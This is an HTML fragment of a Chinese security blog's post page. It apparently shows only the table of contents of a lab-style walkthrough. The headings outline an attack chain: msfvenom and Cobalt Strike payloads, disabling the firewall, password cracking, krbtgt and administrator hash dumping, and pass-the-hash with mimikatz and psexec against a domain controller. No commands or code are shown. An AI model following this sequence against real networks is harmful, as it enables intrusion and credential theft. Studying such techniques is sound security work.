toc-level-5"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-3"><span class="toc-number">1.8.1.3.1.</span> <span class="toc-text"> 上传</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5-4"><span class="toc-number">1.8.1.3.2.</span> <span class="toc-text"> 连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90"><span class="toc-number">1.8.1.3.3.</span> <span class="toc-text"> 查看权限</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.8.1.3.4.</span> <span class="toc-text"> 查看进程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E8%A1%8C%E5%88%97%E8%A1%A8"><span class="toc-number">1.8.1.3.5.</span> <span class="toc-text"> 查看进行列表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF-%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">1.8.1.3.6.</span> <span class="toc-text"> 查看网卡信息、端口信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%97%ADwindows%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-number">1.8.1.3.7.</span> <span class="toc-text"> 关闭Windows防火墙</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E4%BB%A3%E7%90%86"><span class="toc-number">1.8.2.</span> <span class="toc-text"> 制作正向连接代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9C%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.8.2.1.</span> <span class="toc-text"> 制作攻击载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8msfvenom%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.8.2.1.1.</span> <span class="toc-text"> 使用msfvenom生成攻击载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%8E%A9%E7%9B%AE%E5%88%B6%E4%BD%9C"><span class="toc-number">1.8.2.1.1.1.</span> <span class="toc-text"> 使用掩目制作</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0-4"><span class="toc-number">1.8.2.1.1.2.</span> <span class="toc-text"> 上传</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%B6%E4%BD%9Ccs%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.8.2.1.2.</span> <span class="toc-text"> 制作CS木马</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC%E5%B9%B6%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.8.2.2.</span> <span class="toc-text"> 设置监听并上线</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#msf"><span class="toc-number">1.8.2.2.1.</span> <span class="toc-text"> MSF</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">1.8.2.2.1.1.</span> <span class="toc-text"> 运行攻击载荷</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF"><span class="toc-number">1.8.2.2.1.2.</span> <span class="toc-text"> 上线</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cs"><span class="toc-number">1.8.2.2.2.</span> <span class="toc-text"> CS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">1.8.2.2.2.1.</span> <span class="toc-text"> 设置监听器</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%9C%A8%E9%A9%AC"><span class="toc-number">1.8.2.2.2.2.</span> <span class="toc-text"> 执行木马</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E7%BA%BF-2"><span class="toc-number">1.8.2.2.2.3.</span> <span class="toc-text"> 上线</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#00x8-%E5%8F%91%E7%8E%B0%E5%B9%B6%E8%BF%9B%E6%94%BB%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.9.</span> <span class="toc-text"> 00x8-发现并进攻域控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.9.1.</span> <span class="toc-text"> 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="toc-number">1.9.1.1.</span> <span class="toc-text"> 密码收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.9.1.2.</span> <span class="toc-text"> 发现域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.9.1.3.</span> <span class="toc-text"> 密码破解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E7%BB%AD%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.9.1.4.</span> <span class="toc-text"> 继续域控</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF-2"><span class="toc-number">1.9.1.4.1.</span> <span class="toc-text"> 主机信息</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-number">1.9.1.5.</span> <span class="toc-text"> 定位域控</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7-2"><span class="toc-number">1.9.1.5.1.</span> <span class="toc-text"> 域控</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E7%9A%84%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%83%85%E5%86%B5"><span class="toc-number">1.9.1.5.2.</span> <span class="toc-text"> 查看域控的用户登录情况</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8cs"><span class="toc-number">1.9.1.5.2.1.</span> <span class="toc-text"> 使用CS</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8msf"><span class="toc-number">1.9.1.5.2.2.</span> <span class="toc-text"> 使用MSF</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8shell"><span class="toc-number">1.9.1.5.2.3.</span> <span class="toc-text"> 使用shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%9F%9F%E6%8E%A7%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95"><span class="toc-number">1.9.1.5.2.4.</span> <span class="toc-text"> 查看域控管理员登录</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.9.2.</span> <span class="toc-text"> 拿到域控管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E7%AA%83%E5%8F%96%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.9.2.1.</span> <span class="toc-text"> 使用命令窃取进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%BB%BA%E7%AB%8Badministrator%E7%9A%84%E7%94%A8%E6%88%B7shell"><span class="toc-number">1.9.2.2.</span> <span class="toc-text"> 尝试建立administrator的用户shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E5%BB%BA%E7%AB%8B%E4%BC%9A%E8%AF%9D"><span class="toc-number">1.9.2.2.1.</span> <span class="toc-text"> 无法建立会话</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AEdc%E7%9A%84c%E7%9B%98"><span class="toc-number">1.9.2.3.</span> <span class="toc-text"> 尝试访问dc的c盘</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE"><span class="toc-number">1.9.2.3.1.</span> <span class="toc-text"> 无法访问</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E5%BB%BA%E7%AB%8Bshell"><span class="toc-number">1.9.2.4.</span> <span class="toc-text"> CS建立shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6"><span class="toc-number">1.9.2.4.1.</span> <span class="toc-text"> 尝试访问文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.9.3.</span> <span class="toc-text"> 访问域控信息</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.9.3.1.</span> <span class="toc-text"> 添加路由</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%9F%9F%E6%8E%A7%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.9.3.2.</span> <span class="toc-text"> 访问域控主机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F"><span class="toc-number">1.9.3.3.</span> <span class="toc-text"> 主机扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-3"><span class="toc-number">1.9.3.3.1.</span> <span class="toc-text"> 端口扫描</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84pid-sid%E7%9A%84ntml"><span class="toc-number">1.9.3.4.</span> <span class="toc-text"> 获取域用户的PID  SID的NTML</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.9.3.4.1.</span> <span class="toc-text"> 管理员</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#krbtgt"><span class="toc-number">1.9.3.4.2.</span> <span class="toc-text"> krbtgt</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%9F%9F%E6%8E%A7%E7%AE%A1%E7%90%86%E5%91%98"><span class="toc-number">1.9.4.</span> <span class="toc-text"> 登录域控管理员</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pth%E7%99%BB%E5%BD%95%E5%9F%9F%E7%AE%A1%E7%90%86"><span class="toc-number">1.9.4.1.</span> <span class="toc-text"> pth登录域管理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8cs%E7%9A%84%E7%8E%AF%E5%A2%83%E4%B8%8B"><span class="toc-number">1.9.4.1.1.</span> <span class="toc-text"> 在CS的环境下</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">1.9.4.1.1.1.</span> <span class="toc-text"> 执行命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.9.4.1.1.2.</span> <span class="toc-text"> 窃取进程</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AEattack%E5%9F%9F%E6%8E%A7%E7%9A%84shell"><span class="toc-number">1.9.4.1.1.3.</span> <span class="toc-text"> 成功访问attack域控的shell</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8mimikatz"><span class="toc-number">1.9.4.1.2.</span> <span class="toc-text"> 使用mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0mimikatz"><span class="toc-number">1.9.4.1.2.1.</span> <span class="toc-text"> 上传mimikatz</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%A8msf%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8windowssmbpsexec"><span class="toc-number">1.9.4.1.3.</span> <span class="toc-text"> 在MSF环境下使用windows&#x2F;smb&#x2F;psexec</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.9.4.1.3.1.</span> <span class="toc-text"> 条件：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC"><span class="toc-number">1.9.4.1.3.2.</span> <span class="toc-text"> 设置监听</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C"><span class="toc-number">1.9.4.1.3.3.</span> <span class="toc-text"> 结果</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="toc-number">1.10.</span> <span class="toc-text"> 写在最后</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/24/120606809.html" title="Vue3学习"><img src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vue3学习"/></a><div class="content"><a class="title" href="/2023/03/24/120606809.html" title="Vue3学习">Vue3学习</a><time datetime="2023-03-24T00:41:14.000Z" title="发表于 2023-03-24 08:41:14">2023-03-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/791080604.html" title="MSF使用教程"><img src="https://s2.loli.net/2022/04/08/3sgAHoqV2mdCzU1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MSF使用教程"/></a><div class="content"><a class="title" href="/2023/03/16/791080604.html" title="MSF使用教程">MSF使用教程</a><time datetime="2023-03-16T07:12:11.000Z" title="发表于 2023-03-16 15:12:11">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/1905692189.html" title="2022长安杯"><img src="https://s2.loli.net/2022/04/08/yArF9MhpxCblkRJ.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022长安杯"/></a><div class="content"><a class="title" href="/2023/03/16/1905692189.html" title="2022长安杯">2022长安杯</a><time datetime="2023-03-16T07:08:15.000Z" title="发表于 2023-03-16 15:08:15">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/4185480926.html" title="Windows的c盘清理问题"><img src="https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows的c盘清理问题"/></a><div class="content"><a class="title" href="/2023/03/16/4185480926.html" title="Windows的c盘清理问题">Windows的c盘清理问题</a><time datetime="2023-03-16T03:46:36.000Z" title="发表于 2023-03-16 11:46:36">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/4057902274.html" title="hexo博客上传时遇到的问题"><img src="https://s2.loli.net/2022/04/08/3sgAHoqV2mdCzU1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hexo博客上传时遇到的问题"/></a><div class="content"><a class="title" href="/2023/03/16/4057902274.html" title="hexo博客上传时遇到的问题">hexo博客上传时遇到的问题</a><time datetime="2023-03-16T03:28:42.000Z" title="发表于 2023-03-16 11:28:42">2023-03-16</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s2.loli.net/2022/04/08/RLAX9PN5ZmHuzgb.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By like4h</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">like4h's blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>